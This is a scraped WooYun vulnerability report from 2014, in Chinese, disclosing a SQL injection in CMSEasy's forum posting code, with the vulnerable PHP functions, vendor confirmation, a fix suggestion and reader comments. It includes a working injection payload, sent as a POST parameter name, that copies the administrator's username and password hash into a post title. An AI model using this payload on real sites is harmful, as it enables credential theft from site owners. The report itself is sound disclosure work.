{"id": 950, "wybug_id": "wooyun-2014-067521", "wybug_title": "cmseasy 最新版SQL注入一枚(直接出数据无视360webscan)", "wybug_corp": "cmseasy", "wybug_author": "phith0n", "wybug_date": "2014-07-06 01:15", "wybug_open_date": "2014-10-04 01:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向公众公开  简要描述： 真的不是针对，厂家不要介意，赶紧确认我另外两个吧，感谢！无视360webscan。版本：20140605 详细说明：  漏洞与  WooYun: CmsEasy最新 V5.5-UTF8 正式版多处漏洞打包  重复。注入函数在/bbs/add-archive.php，\nif(isset($_POST['submit'])){  \t  if(strtolower(trim($_POST['verify'])) != strtolower($_SESSION['verify'])){          //action_public::turnPage('index.php','验证码输入错误！');  \t  }      $archive = db_bbs_archive::getInstance();            unset($_POST['submit']);      unset($_POST['verify']);      $_POST['username'] = $_COOKIE['login_username'];      $_POST['userid'] = $admin->userid;      $_POST['ip'] = $_SERVER['REMOTE_ADDR'];      $_POST['addtime'] = mktime();      if($id = $archive->inserData($_POST)){          action_public::turnPage('archive-display.php?aid='.$id,'文章添加成功');      }else{      \t  action_public::turnPage('index.php','添加失败，请联系我们！');      }  }\n关注这句话$archive->inserData($_POST)，直接把$_POST放入了inserData函数，我们进去看看：\npublic function inserData($data){       $r = $this->odb->insert($this->tblName,$data);       if($r)           return $this->odb->getInsertId();       else           return false;\t}\n继续跟进：\npublic function insert($table, $data)\t{\t\t$sql = $this->getInsertString($table, $data);\t\treturn $this->execSql($sql);\t}\n继续跟进：\npublic function getInsertString($table, $data)\t{\t\t$n_str = '';\t\t$v_str = '';\t\t$table = $this->filterString($table);\t\tforeach ($data as $k => $v)\t\t{\t\t\t$n_str .= $this->filterString($k).',';\t\t\t$v_str .= \"'\".$this->filterString($v).\"',\";\t\t}\t\t$n_str = preg_replace( \"/,$/\", \"\", $n_str );\t\t$v_str = preg_replace( \"/,$/\", \"\", $v_str );\t\t$str = 'INSERT INTO '.$table.' ('.$n_str.') VALUES('.$v_str.')';\t\treturn $str;\t}\n这个函数实际上就是一个insert语句。其中调用filterString对数据进行过滤。但只是加转义单引号而已，而注入语句中的key并没有过滤。POST的时候，将注入语句放在KEY的位置，就能注入了。详见漏洞证明。   漏洞证明：  到/bbs，发表帖子，抓包。增加一个POST参数，参数名是：\nusername)/**/values((select/**/concat(username,0x23,password)/**/from/**/cmseasy_user/**/limit/**/0,1),2,3,4,5,6)#\n值随意。效果图如下：\n\n发送即可。然后数据库中可以看到一篇帖子的title被注入成管理员密码：\n\n它的aid是8，那么我们只要访问http://localhost/easy/bbs/archive-display.php?aid=8即可看到结果：\n\n我们不知道aid是多少的时候，遍历一下就行了。   修复方案：  value要过滤，key也要过滤   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-07 09:49 厂商回复： 感谢，立即修正 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-06 10:40 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  师傅，你为什么这么叼？    \n     2014-07-06 15:07 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  你为什么这么叼？    \n     2014-07-06 23:47 |    \t\txch4er \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 小弟才疏学浅,前来悉心与各位大牛研究探索.)\t\t \n  师傅，你为什么这么叼？    \n     2014-07-09 13:33 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  师傅，你为什么这么叼？    \n     2014-07-09 23:07 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  注意2楼。。。    \n     2014-07-12 00:02 |    \t\tAppLeU0 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 代码审计入门)\t\t \n  师傅，你为什么这么叼？     \n     2014-07-14 23:47 |    \t\tazuer \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:30        )\t\t \n  师傅，你为什么这么叼？     \n     2014-07-29 10:37 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  师傅，你为什么这么叼？    \n     2014-10-04 01:19 |    \t\tMurk Emissary \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:14        | 低调做人 低调行事)\t\t \n  师傅，你为什么这么叼？    \n     2014-10-04 08:19 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  猴儿们 莫调皮    \n     2014-10-09 11:25 |    \t\t噬魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:37        | 08安全团队)\t\t \n  师傅，你为什么这么叼？    \n     2015-06-07 15:23 |    \t\tEric_zZ \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | Just try it!)\t\t \n  楼主，我刚刚搞了下有一些还能注册，但是发帖子抓包的时候老显示验证码错误，大小写都考虑了还是显示验证码错误，这是不是说明也修复了？    \n     2015-06-07 15:50 |    \t\tEric_zZ \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | Just try it!)\t\t \n  我步骤错了。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}